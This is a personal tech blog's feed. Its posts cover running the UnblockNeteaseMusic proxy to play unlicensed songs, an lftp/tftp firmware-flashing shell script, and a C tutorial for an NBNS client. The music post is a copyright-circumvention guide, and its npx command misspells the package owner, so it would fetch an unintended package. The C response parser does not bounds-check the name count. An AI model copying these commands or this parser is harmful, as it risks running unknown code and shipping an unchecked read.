    &lt;DT&gt;&lt;A HREF=&quot;http://www.litreily.top/&quot; ADD_DATE=&quot;1588501602&quot; ICON=&quot;data:image/png;base64,None&quot;&gt;litreily&lt;/A&gt;
    &lt;DT&gt;&lt;A HREF=&quot;https://litreily.gitbook.io/notes/content/&quot; ADD_DATE=&quot;1588501602&quot; ICON=&quot;data:image/png;base64,None&quot;&gt;Notes&lt;/A&gt;
    &lt;DT&gt;&lt;A HREF=&quot;http://www.smslit.top/&quot; ADD_DATE=&quot;1588501602&quot; ICON=&quot;data:image/png;base64,None&quot;&gt;smslit&lt;/A&gt;
    &lt;DT&gt;&lt;A HREF=&quot;https://github.com/&quot; ADD_DATE=&quot;1588501602&quot; ICON=&quot;data:image/png;base64,None&quot;&gt;github&lt;/A&gt;
    &lt;DT&gt;&lt;A HREF=&quot;https://coding.net/user&quot; ADD_DATE=&quot;1588501602&quot; ICON=&quot;data:image/png;base64,None&quot;&gt;coding&lt;/A&gt;
    &lt;/DL&gt;&lt;p&gt;
    &lt;DT&gt;&lt;H3 ADD_DATE=&quot;1588501602&quot; LAST_MODIFIED=&quot;1588501602&quot;&gt;论坛(forum)&lt;/H3&gt;
    &lt;DL&gt;&lt;p&gt;
    &lt;DT&gt;&lt;A HREF=&quot;https://blog.coding.net/&quot; ADD_DATE=&quot;1588501602&quot; ICON=&quot;data:image/png;base64,None&quot;&gt;Coding 博客&lt;/A&gt;
    &lt;DT&gt;&lt;A HREF=&quot;http://www.ituring.com.cn/&quot; ADD_DATE=&quot;1588501602&quot; ICON=&quot;data:image/png;base64,None&quot;&gt;图灵社区&lt;/A&gt;
    &lt;DT&gt;&lt;A HREF=&quot;http://www.elecfans.com/&quot; ADD_DATE=&quot;1588501602&quot; ICON=&quot;data:image/png;base64,None&quot;&gt;电子发烧友&lt;/A&gt;
    &lt;/DL&gt;&lt;p&gt;
    &lt;DT&gt;&lt;H3 ADD_DATE=&quot;1588501602&quot; LAST_MODIFIED=&quot;1588501602&quot;&gt;编程(Programming)&lt;/H3&gt;
    &lt;DL&gt;&lt;p&gt;
    &lt;DT&gt;&lt;H3 ADD_DATE=&quot;1588501602&quot; LAST_MODIFIED=&quot;1588501602&quot;&gt;算法(Algorithm)&lt;/H3&gt;
    &lt;DL&gt;&lt;p&gt;
    &lt;DT&gt;&lt;A HREF=&quot;http://www.acmerblog.com/&quot; ADD_DATE=&quot;1588501602&quot; ICON=&quot;data:image/png;base64,None&quot;&gt;Acm之家&lt;/A&gt;
    &lt;DT&gt;&lt;A HREF=&quot;http://www.pythontip.com/acm/problemCategory&quot; ADD_DATE=&quot;1588501602&quot; ICON=&quot;data:image/png;base64,None&quot;&gt;各大OJ题目分类&lt;/A&gt;
    &lt;/DL&gt;&lt;p&gt;
    &lt;DT&gt;&lt;H3 ADD_DATE=&quot;1588501602&quot; LAST_MODIFIED=&quot;1588501602&quot;&gt;linux&lt;/H3&gt;
    &lt;DL&gt;&lt;p&gt;
    &lt;DT&gt;&lt;A HREF=&quot;http://elixir.free-electrons.com/linux/latest/source&quot; ADD_DATE=&quot;1588501602&quot; ICON=&quot;data:image/png;base64,None&quot;&gt;linux - Elixir - Free Electrons&lt;/A&gt;
&lt;/DL&gt;&lt;p&gt;
</code></pre>
<p>最后导入Chrome看下，Chrome会添加一个新的文件夹<strong>已导入</strong>，我们可以把子文件夹拖出来就ok了，再看看图标，如果最近有访问过，其实不加icon的base64信息也是可以显示出来的，就算现在没有，以后只要访问过一次就会自动更新，这点倒是有点像交换机的学习机制。</p>
<p><img src="/assets/chrome/favorite.png" alt="favorites"></p>
<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>这个脚本也已经更新到了<a href="https://github.com/Litreily/Python-scripts/blob/master/md2bm/mb2bm.py" target="_blank" rel="noopener">GitHub Litreily/Python-scripts</a>，欢迎有需要的小伙伴们使用。</p>
]]></content>
      
        <categories>
            
            <category> Python </category>
            
        </categories>
        
        
        <tags>
            
            <tag> markdown </tag>
            
            <tag> chrome </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[解锁网易云音乐灰色无版权歌曲]]></title>
      <url>https://www.litreily.top/2020/05/03/netease/</url>
      <content type="html"><![CDATA[<p>由于版权之争，网易云的很多歌曲都灰掉并且无法播放了，想要使其可以播放还是有办法的，万能的Google和Github让我找到了<a href="https://github.com/nondanee/UnblockNeteaseMusic" target="_blank" rel="noopener">答案</a>，直接上享用方法吧。</p>
<h2 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h2><ul>
<li>一个可以远程访问的服务器，比如vps，阿里云、腾讯云、...</li>
<li>如果没有服务器，只能寻找别人搭建好的服务</li>
</ul>
<h2 id="搭建服务"><a href="#搭建服务" class="headerlink" title="搭建服务"></a>搭建服务</h2><p>在服务器端，首先安装依赖的工具<code>npx</code>，如果有则忽略</p>
<pre><code class="zsh">sudo apt install npm
sudo npm i -g npx
</code></pre>
<p>然后clone项目UnblockNeteaseMusic.git到本地</p>
<pre><code class="zsh">git clone git@github.com:nondanee/UnblockNeteaseMusic.git
cd UnblockNeteaseMusic
</code></pre>
<p>接下来是运行服务，有好几种方式，下面介绍3种</p>
<h3 id="npx启动"><a href="#npx启动" class="headerlink" title="npx启动"></a>npx启动</h3><p>第一种，最简单的是直接用npx启动，默认以8080端口打开</p>
<pre><code class="zsh">npx @npndanee/unblockneteasemusic
</code></pre>
<h3 id="node启动"><a href="#node启动" class="headerlink" title="node启动"></a>node启动</h3><p>第二种方式，使用node, <code>-p</code>参数指定端口</p>
<pre><code class="zsh">npde app.js -p 4321
</code></pre>
<h3 id="搭建系统服务"><a href="#搭建系统服务" class="headerlink" title="搭建系统服务"></a>搭建系统服务</h3><p>第三种，使用服务方式，方便管理和查看状态</p>
<pre><code class="zsh"># 新建服务
# 注意填写的路径是clone的UnblockNeteaseMusic所在目录
sudo cat &gt; /etc/systemd/system/UnblockNeteaseMusic.service &lt;&lt;EOF
[Unit]
Description=UnblockNeteaseMusic
After=network.target
Wants=network.target

[Service]
Type=simple
PIDFile=/var/run/UnblockNeteaseMusic.pid
WorkingDirectory=/home/litreily/UnblockNeteaseMusic
ExecStart=/home/litreily/UnblockNeteaseMusic/app.js -p 4321
RestartPreventExitStatus=23
Restart=always

[Install]
WantedBy=multi-user.target
EOF

# 添加app.js的执行权限，不添加可能无法启动服务
sudo chmod a+x app.js

# 启动、停止、重启、查看服务
systemctl start UnblockNeteaseMusic.service
systemctl stop UnblockNeteaseMusic.service
systemctl restart UnblockNeteaseMusic.service
systemctl status UnblockNeteaseMusic.service
</code></pre>
<p>除了这三种以外，还可以使用Docker，具体参考github文档即可</p>
<h2 id="使用代理"><a href="#使用代理" class="headerlink" title="使用代理"></a>使用代理</h2><p>在服务器端搭建好了代理，就需要在我们的客户端使用它咯，在windows上，网易云音乐不管UWP应用还是普通安装应用都是直接设置代理的。</p>
<p><img src="/assets/music/netease-proxy.png" alt="网易云音乐代理"></p>
<p>当然，也可以使用其它工具设置代理，比如小飞机、系统代理等等，因为这个代理已经实现了完整的http/https服务，所以也是可以作为全局代理使用的，不过我已经使用其它代理用于科学上网，所以就只在网易云配置下代理就好了。</p>
<p>该工具非常强大，代理配置好后，我看了下之前灰掉的歌曲，确实可以正常播放了，amazing!</p>
<p><img src="/assets/stickers/cheers.gif" alt="cheers"></p>
<p>该工具也适用于其它系统和移动端，有需要的可以尝试下。最后提醒下各位，有能力的还是支持正版，同时也请低调使用。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://github.com/nondanee/UnblockNeteaseMusic" target="_blank" rel="noopener">Github UnblockNeteaseMusic</a></li>
<li><a href="https://www.nange.cn/unlock-netease-music.html" target="_blank" rel="noopener">解锁网易云音乐灰色无版权歌曲，使其变为正常可听可下载状态</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> Media </category>
            
        </categories>
        
        
        <tags>
            
            <tag> music </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[lftp获取FTP Server端最新文件]]></title>
      <url>https://www.litreily.top/2020/04/30/lftp_get/</url>
      <content type="html"><![CDATA[<p>最近解一个bug，要频繁编译和烧录FW，每次都要将image从远程的FTP server手动copy到本地，然后使用tftp进行烧录，实在不胜其烦。虽然上一篇<a href="https://www.litreily.top/2020/04/27/tftp/">简单实用的tftp烧录image脚本</a>提高了烧录效率，但是每次将image拷贝到本地也是麻烦。</p>
<p>这次，我依旧想到了WSL, 使用shell脚本还是更加方便快捷，思路很简单，检查server端的最新文件，得到文件名后使用lftp下载到本地。</p>
<h2 id="获取最新文件"><a href="#获取最新文件" class="headerlink" title="获取最新文件"></a>获取最新文件</h2><p>FTP Server文件存储方式是将每天的新数据归档到以当日日期命名的文件夹中，如今天<code>20200430</code></p>
<pre><code class="zsh">➜  lftp -u &quot;username,password&quot; ftp://1.2.3.4
lftp username@1.2.3.4:~&gt; ls
04-27-20  02:03PM       &lt;DIR&gt;          20200427
04-29-20  05:36PM       &lt;DIR&gt;          20200429
04-30-20  01:11PM       &lt;DIR&gt;          20200430
lftp username@1.2.3.4:/&gt; cd 20200430
lftp username@1.2.3.4:/20200430&gt; ls
04-30-20  08:45AM             25165953 20200430084545-FW-V1.2.1.4.img
04-30-20  09:09AM             25165953 20200430090947-FW-V1.2.1.4.img
04-30-20  10:04AM             25165953 20200430100405-FW-V1.2.1.4.img
04-30-20  11:02AM             25165953 20200430110247-FW-V1.2.1.4.img
04-30-20  01:11PM             25165953 20200430131110-FW-V1.2.1.4.img
lftp username@1.2.3.4:/20200430&gt; exit
➜  
</code></pre>
<p>所以获取当日文件列表时需要先进入目录，然后ls并将结果存到本地tmp文件</p>
<pre><code class="zsh">dir=$(date &#39;+%Y%m%d&#39;)
lftp -u &quot;$ftp_user,$ftp_pass&quot; $ftp_host &lt;&lt;-EOF &gt; $tmpfile
    cd $dir
    ls
EOF
</code></pre>
<p>由于ls结果默认以时间顺序排序，最新文件在最后一行，这就好办了，结合<code>tail</code>和<code>awk</code>就可以得到最新文件名。</p>
<pre><code class="zsh">image=$(tail -1 $tmpfile |awk &#39;{print $4}&#39;)
</code></pre>
<p>知道了文件名，先看下本地有没有下载过，如果有则无需重复下载，如果没有就使用<code>lftp</code>的<code>get</code>指令下载到本地。</p>
<pre><code class="zsh"># return if $image already exist in local
[ -f $image ] &amp;&amp; return
[ &quot;x$image&quot; = &quot;x&quot; ] &amp;&amp; echo &quot;no image today&quot; &amp;&amp; exit 1

lftp -u &quot;$ftp_user,$ftp_pass&quot; $ftp_host &lt;&lt;-EOF
    cd $dir
    get $image
EOF
</code></pre>
<p>以上就完成了最新image的获取，结合之前使用<code>tftp</code>烧录image的脚本，更新shell脚本得到下面的完整代码。</p>
<h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><pre><code class="zsh">#!/bin/zsh
# download image from FTP server and burn it into router with tftp

burn()
{
    tftp 192.168.1.1 &lt;&lt;-EOF &gt; /dev/null
        binary
        put $1
    EOF
}

dl_newest_image()
{
    ftp_user=&quot;username&quot;
    ftp_pass=&quot;password&quot;
    ftp_host=&quot;ftp://1.2.3.4&quot;
    tmpfile=~/tmp/ftp_list

    # get ftp file list of today
    dir=$(date &#39;+%Y%m%d&#39;)
    lftp -u &quot;$ftp_user,$ftp_pass&quot; $ftp_host &lt;&lt;-EOF &gt; $tmpfile
        cd $dir
        ls
    EOF

    image=$(tail -1 $tmpfile |awk &#39;{print $4}&#39;)

    # return if $image already exist in local
    [ -f $image ] &amp;&amp; return
    [ &quot;x$image&quot; = &quot;x&quot; ] &amp;&amp; echo &quot;no image today&quot; &amp;&amp; exit 1

    lftp -u &quot;$ftp_user,$ftp_pass&quot; $ftp_host &lt;&lt;-EOF
        cd $dir
        get $image
    EOF
}


cd $DT/tmp/imgs/ # $DT代表Win10的Desktop, 是我.zshrc的一个环境变量
image=$1

if [ &quot;x$1&quot; = &quot;x&quot;  ]; then
    dl_newest_image
fi

echo &quot;start burning $image&quot;
burn $image
</code></pre>
<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>为了方便，脚本文件名更新为<code>bi</code>, burn image的意思，使用方法含带参和不带参两种。</p>
<ol>
<li>带参 - 烧录指定文件</li>
<li>不带参 - 从FTP server获取最新文件并烧录</li>
</ol>
<pre><code class="zsh">➜  bi 20200430110247-FW-V1.2.1.4.img
start burning 20200430110247-FW-V1.2.1.4.img
➜  bi
`20200430131128-RBR20-V2.7.1.8RC1-ubi4.img` at 15953920 (45%) 7.41M/s eta:2s [Receiving data]
start burning 20200430131128-RBR20-V2.7.1.8RC1-ubi4.img
</code></pre>
<h2 id="Notice"><a href="#Notice" class="headerlink" title="Notice"></a>Notice</h2><ol>
<li>其实使用<code>curl</code>也可以获取FTP Server的列表信息，使用<code>wget</code>也可以下载FTP Server文件，但是鉴于公司网络代理环境复杂，容易莫名失败，所以还是使用<code>lftp</code>；</li>
<li>用户名密码不该直接放脚本内部，可以单独存到配置文件并设置好权限，然后脚本去读文件，当然啦，私人电脑忽略；</li>
<li>脚本中<code>&lt;&lt;-EOF</code>的<code>-</code>表示忽略下面输入行每行开始的tab键，所以被<code>EOF</code>包含的部分不能使用空格键替代tab键，否则会出错。</li>
</ol>
]]></content>
      
        <categories>
            
            <category> Linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> shell </tag>
            
            <tag> ftp </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[简单实用的tftp烧录image脚本]]></title>
      <url>https://www.litreily.top/2020/04/27/tftp/</url>
      <content type="html"><![CDATA[<p>烧录FW image时，经常需要打开带有UI界面的tftp客户端，然后输入IP，选择FW image，然后点击写入，很是繁琐。</p>
<p>为了简化这个过程，我决定使用shell script，在win10中自带WSL(windows subsystem for linux)，配合zsh食用。</p>
<pre><code class="zsh">#!/bin/zsh
# install to ~/bin/burnImage

[ &quot;x$1&quot; = &quot;x&quot;  ] &amp;&amp; echo &quot;usage: ${0##*/} &lt;imagefile&gt;&quot; &amp;&amp; exit 1

tftp 192.168.1.1 &lt;&lt;-EOF &gt; /dev/null
    binary
    put $1
EOF
</code></pre>
<p>脚本使用<code>tftp</code>连接tftp server 192.168.1.1, 然后进入<code>binary</code>模式，最后将image文件<code>$1</code>传输至server端。</p>
<p>使用方法很简单，保证该文件<code>burnImage</code>所在目录在环境变量<code>$PATH</code>中，之后在FW image所在目录执行以下指令完成烧录，非常方便。</p>
<pre><code class="zsh">burnImage FW.img
</code></pre>
]]></content>
      
        <categories>
            
            <category> Linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> shell </tag>
            
            <tag> tftp </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[NBNS客户端的C语言实现]]></title>
      <url>https://www.litreily.top/2020/03/15/nbns_code/</url>
      <content type="html"><![CDATA[<p>接上一篇<a href="/2020/02/28/nbns/">【网络协议详解1 - NBNS】</a>对NBNS的介绍，这一篇将要讲述使用C语言如何实现一个NBNS客户端，用于向局域网内其它设备发送NBNS NODE STATUS QUERY，并将接收到的RESPONSE信息打印出来。其实也就是一个UDP socket的实例。</p>
<p><img src="/assets/network/udp-socket.png" alt="UDP socket flowchart"></p>
<p>编写一个客户端，首先要清楚它要完成什么任务，进而确定完成任务的方法和步骤。其任务很简单，就是NBNS数据包的发送和接收，也就是一个简单的socket收发进程。实现主要分以下几步：</p>
<ol>
<li><strong>组包</strong>得到NBNS NODE STATUS QUERY</li>
<li>发送NBNS NODE STATUS QUERY</li>
<li>接收RESPONSE并解析</li>
</ol>
<h2 id="include-amp-define"><a href="#include-amp-define" class="headerlink" title="include &amp; define"></a>include &amp; define</h2><p>首先来看看编写该客户端会用到的头文件及相关宏定义</p>
<pre><code class="c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt; /* for exit */
#include &lt;string.h&gt; /* for memset */
#include &lt;unistd.h&gt; /* for close */
#include &lt;sys/socket.h&gt; /* for socket, bind */
#include &lt;sys/time.h&gt; /* for timeval */
#include &lt;netinet/in.h&gt; /* for socksaddr_in */
#include &lt;arpa/inet.h&gt; /* for htons */

#define NBNS_PORT 137
#define NBNS_TYPE_NB 0x0020
#define NBNS_TYPE_NBSTAT 0x0021
#define NBNS_CLASS_IN 0x0001
#define BUFFER_SIZE 1024 /* buffer size for recv packet */
#define IP_SIZE 16 /* length of IP address like 192.168.1.1 */
</code></pre>
<p>关于NBNS，其公知的端口号是137，在发送请求时会在目的地址中用到。</p>
<h2 id="组包结构体"><a href="#组包结构体" class="headerlink" title="组包结构体"></a>组包结构体</h2><p>根据上一篇的内容，我们可以知道NBNS NODE STATUS的请求包和响应包的数据格式，据此可以编写相应的结构体。</p>
<pre><code class="c">typedef unsigned int uint32;
typedef unsigned short uint16;
typedef unsigned char uint8;

struct nbns_header {
    uint16 tid; /* Transaction ID */
    uint16 flags;
    uint16 question;
    uint16 answer;
    uint16 authority;
    uint16 additional;
} __attribute__ ((packed));

// NBNS NODE STATUS QUERY FORMAT
struct nbns_request {
    struct nbns_header header;

    char qname[34];
    uint16 qtype;
    uint16 qclass;
} __attribute__ ((packed));

struct nbns_name {
    char name[16];
    uint16 flags;
} __attribute__ ((packed));

// NBNS NODE STATUS RESPONSE FORMAT
struct nbns_response_header {
    struct nbns_header header;

    char rname[34];
    uint16 rtype;
    uint16 rclass;

    uint32 ttl;
    uint16 length;
    uint8 num_of_names;
} __attribute__ ((packed));
</code></pre>
<p>注意每个结构体后的<code>__attribute__ ((packed))</code>，这是为了告诉编译器不要对其进行对齐优化，保持数据的紧凑性，以防数据解析出错。</p>
<h2 id="名称编解码"><a href="#名称编解码" class="headerlink" title="名称编解码"></a>名称编解码</h2><p>在进入正题之前，我们先来看下NetBIOS名称的编解码，这在后续发送请求和解析响应中都会用到。从RFC1001可知，NBNS请求包中的Name是被编码的，在<a href="/2020/02/28/nbns/#NetBIOS-命名编码">上一篇</a>中已经讲述过了。</p>
<h3 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h3><p>对于NODE STATUS QUERY, 通常将NBNS name设为<code>*</code>, 就是一个通配符，使用下面的函数可以对其编码。</p>
<pre><code class="c">// encode &quot;*&quot; to &quot;CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;
void encode_name(char *name)
{
    int i;

    name[0] = 0x20; /* length of name */
    name[1] = ((&#39;*&#39; &gt;&gt; 4) &amp; 0x0F) + &#39;A&#39;;
    name[2] = (&#39;*&#39; &amp; 0x0F) + &#39;A&#39;;

    for (i = 3; i &lt; 33; i++)
        name[i] = &#39;A&#39;;

    name[i] = &#39;\0&#39;; /* end of name */
}
</code></pre>
<h3 id="解码"><a href="#解码" class="headerlink" title="解码"></a>解码</h3><p>解码也很简单，就是编码的逆过程。上面的编码函数只针对<code>*</code>，但这里的解码函数却是针对所有满足格式要求的字符串。</p>
<pre><code class="c">void decode_name(char *name, char *dst)
{
    int i;

    if (name[0] != 0x20)
        return;
    for (i = 1; i &lt; 0x20; i+=2)
        dst[i/2] = (((name[i]-&#39;A&#39;) &lt;&lt; 4) &amp; 0xF0) + ((name[i+1]-&#39;A&#39;) &amp; 0x0F);  
    dst[i/2] = &#39;\0&#39;;
}
</code></pre>
<h2 id="create-socket"><a href="#create-socket" class="headerlink" title="create socket"></a>create socket</h2><h3 id="socket"><a href="#socket" class="headerlink" title="socket"></a>socket</h3><p>好了，进入正题。在执行数据收发之前需要创建UDP socket, 这里会用到socket函数。</p>
<pre><code class="c">#include &lt;sys/socket.h&gt;

int socket(int domain, int type, int protocol);

RETURN VALUE
       On success, a file descriptor for the new socket is returned.  
       On error, -1 is returned, and errno is set appropriately.
</code></pre>
<p>下面简要介绍下相关参数。</p>
<ul>
<li><p>domain<br>常见的网络通信域domain主要有<code>AF_UNIX</code>, <code>AF_INET</code>, <code>AF_INET6</code>, <code>AF_NETLINK</code>，对于常见的TCP/UDP传输，基于IPv4协议，我们选择<code>AF_INET</code>即可。</p>
</li>
<li><p>type<br>type代表socket类型，常用的包含针对TCP的<code>SOCK_STREAM</code>、针对UDP的<code>SOCK_DGRAM</code>，以及针对需要访问源网络数据（应用层以下数据）的<code>SOCK_RAW</code>。显然本文使用的是<code>SOCK_DGRAM</code>.</p>
</li>
<li><p>protocol<br>protocol通常设为0，当然也可以针对协议进行配置，比如UDP对应的<code>IPPROTO_UDP</code>，其中IPPROTO是IP Protocol的缩写。</p>
</li>
</ul>
<h3 id="创建socket"><a href="#创建socket" class="headerlink" title="创建socket"></a>创建socket</h3><p>下面来实现一个open_socket函数，用于打开一个socket，可以把它当做一个信封，等待后面写好信件放进去。</p>
<pre><code class="c">int open_socket(void)
{
    int sock;
    struct sockaddr_in saddr;

    sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock &lt; 0)
        handle_error(&quot;socket&quot;);

    memset(&amp;saddr, 0, sizeof(saddr));
    saddr.sin_family = AF_INET;
    saddr.sin_port = 0;
    saddr.sin_addr.s_addr = htonl(INADDR_ANY);

    if (bind(sock, (struct sockaddr *)&amp;saddr, sizeof(saddr)) == -1)
        handle_error(&quot;bind&quot;);

    return sock;
}
</code></pre>
<p>这里要注意几点：</p>
<ol>
<li>网络字节序和主机字节序不一定一样，需要使用<code>htonl</code>, <code>htons</code>函数进行转换<ul>
<li>h - host</li>
<li>n - network</li>
<li>s - short 2个字节</li>
<li>l - long 4个字节</li>
</ul>
</li>
<li>源地址的端口port设为0，代表由网络协议栈分配</li>
<li>bind函数用于绑定发送地址，类似于往信封上写好寄信人的地址信息</li>
<li>handle_error是一个异常处理函数，检测到错误后调用其打印错误信息并退出程序。</li>
</ol>
<h2 id="发送请求"><a href="#发送请求" class="headerlink" title="发送请求"></a>发送请求</h2><h3 id="sendto"><a href="#sendto" class="headerlink" title="sendto"></a>sendto</h3><p>发送函数包括组包和发送两部分，将请求信息按照组包格式逐一赋值，然后通过<code>sendto</code>发送数据包。</p>
<pre><code class="c">#include &lt;sys/socket.h&gt;

ssize_t sendto(int sockfd, const void *buf, size_t len, int flags,
               const struct sockaddr *dest_addr, socklen_t addrlen);

RETURN VALUE
       On success, these calls return the number of bytes sent.
       On error, -1 is returned, and errno is set appropriately.
</code></pre>
<p>发送成功则返回真实的发送字节数，否则返回-1并更新errno.</p>
<h3 id="发送数据"><a href="#发送数据" class="headerlink" title="发送数据"></a>发送数据</h3><pre><code class="c">int send_nbns_query(int sock, struct in_addr dest_ip)
{
    struct sockaddr_in dest;
    struct nbns_request req;

    memset(&amp;dest, 0, sizeof(dest));
    dest.sin_family = AF_INET;
    dest.sin_port = htons(NBNS_PORT);
    dest.sin_addr = dest_ip;

    req.header.tid = htons(1);
    req.header.flags = htons(0x0000);
    req.header.question = htons(1);
    req.header.answer = 0;
    req.header.authority = 0;
    req.header.additional = 0;
    encode_name(req.qname);
    req.qtype = htons(NBNS_TYPE_NBSTAT);
    req.qclass = htons(NBNS_CLASS_IN);

    return sendto(sock, (char *)&amp;req, sizeof(req), 0,
           (struct sockaddr *)&amp;dest, sizeof(dest));
}
</code></pre>
<p>注意，除了0、单字节数据、单字节数组外，其余数据都需要使用<code>htons</code>或<code>htonl</code>进行转换，将主机字节序转换为网络字节序。</p>
<h2 id="接收响应"><a href="#接收响应" class="headerlink" title="接收响应"></a>接收响应</h2><h3 id="recvfrom"><a href="#recvfrom" class="headerlink" title="recvfrom"></a>recvfrom</h3><p>发送请求后，便可以使用<code>recvfrom</code>函数接收响应数据了。</p>
<pre><code class="c">#include &lt;sys/socket.h&gt;

ssize_t recvfrom(int sockfd, void *buf, size_t len, int flags,
                 struct sockaddr *src_addr, socklen_t *addrlen);

RETURN VALUE
    These calls return the number of bytes received, or -1 if an error occurred.
    In the event of an error, errno is set to indicate the error.
    Datagram sockets in various domains permit zero-length datagrams.
    When such a datagram is received, the return value is 0.
</code></pre>
<p>接收成功返回接收到的字节数，否则返回-1。当然如何接收字节为0则返回0.</p>
<h3 id="接收数据"><a href="#接收数据" class="headerlink" title="接收数据"></a>接收数据</h3><pre><code class="c">void recv_nbns_response(int sock)
{
    struct timeval tv;
    struct sockaddr_in src_addr;
    socklen_t src_len = sizeof(src_addr);
    ssize_t recv_len = 0;
    char res_buf[BUFFER_SIZE];
    char src_ip[IP_SIZE] = {0};

    tv.tv_sec = 5;
    tv.tv_usec = 0;
    /* set timeout 5s for some not exist PC */
    if (setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &amp;tv, sizeof(tv)) &lt; 0)
        handle_error(&quot;setsockopt&quot;);
    recv_len = recvfrom(sock, (char *)res_buf, BUFFER_SIZE, 0,
        (struct sockaddr *)&amp;src_addr, &amp;src_len);
    if (recv_len &lt; 0)
        handle_error(&quot;recvfrom&quot;);
    else if (recv_len &lt; sizeof(struct nbns_response_header))
        return;

    inet_ntop(AF_INET, (struct in_addr *)&amp;src_addr.sin_addr,
        (char *)&amp;src_ip, IP_SIZE);
    printf(&quot;recv response from %s : %ld Bytes\n&quot;, src_ip, recv_len);
    show_nbns_response(res_buf);
}
</code></pre>
<p>该函数通过<code>recvfrom</code>接收数据并存入字符数组<code>res_buf</code>中，同时可以保存发送方的地址信息并通过<code>inet_ntop</code>转换为点分十进制IP地址。最后通过调用函数<code>show_nbns_response</code>打印解析数据。</p>
<p>接收过程中，要考虑到数据来源的一方不存在的情况，也就是永远收不到数据的情况，比如请求IP地址为<code>192.168.1.10</code>的设备，但此刻该设备关机了。为此，我们需要设置超时时间，通过<code>setsockopt</code>函数可以配置socket相关的可选项，当发生超时时，进行错误处理并退出。</p>
<h3 id="打印输出"><a href="#打印输出" class="headerlink" title="打印输出"></a>打印输出</h3><p>接收数据后会调用<code>show_nbns_response</code>函数进行打印输出。</p>
<pre><code class="c">void show_nbns_response(char *buf)
{
    struct nbns_response_header *res;
    struct nbns_name *pname, *pend;
    char rname[18] = {0};
    char echar = &#39;\0&#39;;

    res = (struct nbns_response_header *)buf;
    decode_name(res-&gt;rname, rname);

    printf(
        &quot;Transaction: %d\n&quot; \
        &quot;Flags: 0x%04x\n&quot; \
        &quot;Questions: %d\n&quot; \
        &quot;Answers: %d\n&quot; \
        &quot;Authority: %d\n&quot; \
        &quot;Additional: %d\n&quot; \
        &quot;RR_Name: %s (%s)\n&quot; \
        &quot;RR_Type: %s\n&quot; \
        &quot;RR_Class: %s\n&quot; \
        &quot;TTL: %d\n&quot; \
        &quot;Data length: %d\n&quot; \
        &quot;\nNumber of names: %d\n&quot;,
        ntohs(res-&gt;header.tid),
        ntohs(res-&gt;header.flags),
        ntohs(res-&gt;header.question),
        ntohs(res-&gt;header.answer),
        ntohs(res-&gt;header.authority),
        ntohs(res-&gt;header.additional),
        res-&gt;rname + 1, rname,
        ntohs(res-&gt;rtype) == NBNS_TYPE_NBSTAT ? &quot;NBSTAT (33)&quot; : &quot;NB (32)&quot;,
        ntohs(res-&gt;rclass) == NBNS_CLASS_IN ? &quot;IN (1)&quot; : &quot;UNKNOWN&quot;,
        ntohl(res-&gt;ttl),
        ntohs(res-&gt;length),
        res-&gt;num_of_names);

    pname = (struct nbns_name *)&amp;buf[sizeof(struct nbns_response_header)];
    pend = pname + res-&gt;num_of_names;
    printf(&quot;---------------------------\n&quot;);
    for (; pname &lt; pend; pname++ ) {
        /* ignore the last byte of name*/
        echar = pname-&gt;name[15];
        pname-&gt;name[15] = &#39;\0&#39;;
        printf(&quot;Name: %s&lt;%02x&gt;\n&quot;, pname-&gt;name, echar);
        printf(&quot;Name flags: 0x%04x\n&quot;, ntohs(pname-&gt;flags));
        printf(&quot;---------------------------\n&quot;);
    }
}
</code></pre>
<p>由于不清楚发送方究竟会发送多少组名称，所以先从缓存数组中读取头部信息，然后根据头部信息提供的num_of_names确定名称格式，再逐一打印出来。读取数据的过程就像是收件方接收到信件然后进行阅读一样。</p>
<p>注意，这里有用到<code>ntohs</code>, <code>ntohl</code>进行字节序的转换，同时有用到decode_name进行名称的解码。</p>
<h2 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h2><p>最后简单描述下异常处理函数<code>handle_error</code>, 其实很简单，就是在发生错误的情况下关闭资源，打印错误信息，最后退出程序。</p>
<pre><code class="c">int nbns_sock; /* global value */
static inline void handle_error(char *msg)
{
    if (nbns_sock &gt;= 0)
        close(nbns_sock);
    perror(msg);
    exit(EXIT_FAILURE);
}
</code></pre>
<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>程序编写完成，使用<code>gcc</code>编译即可，下面给出测试用例↓</p>
<pre><code class="bash">➜ nbnstat 192.168.1.1
Send nbns query to 192.168.1.1
recv response from 192.168.1.1 : 247 Bytes
Transaction: 1
Flags: 0x8580
Questions: 0
Answers: 1
Authority: 0
Additional: 0
RR_Name: CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA (*)
RR_Type: NBSTAT (33)
RR_Class: IN (1)
TTL: 0
Data length: 191

Number of names: 8
---------------------------
Name: SMBSHARE       &lt;00&gt;
Name flags: 0x4400
---------------------------
Name: SMBSHARE       &lt;03&gt;
Name flags: 0x4400
---------------------------
Name: SMBSHARE       &lt;1f&gt;
Name flags: 0x4400
---------------------------
Name: SMBSHARE       &lt;20&gt;
Name flags: 0x4400
---------------------------
Name: __MSBROWSE__&lt;01&gt;
Name flags: 0xc400
---------------------------
Name: WORKGROUP      &lt;00&gt;
Name flags: 0xc400
---------------------------
Name: WORKGROUP      &lt;1d&gt;
Name flags: 0x4400
---------------------------
Name: WORKGROUP      &lt;1e&gt;
Name flags: 0xc400
---------------------------
</code></pre>
<p>除了flags信息使用原有的16进制表示外，其余数据均以整型或字符串形式显示。</p>
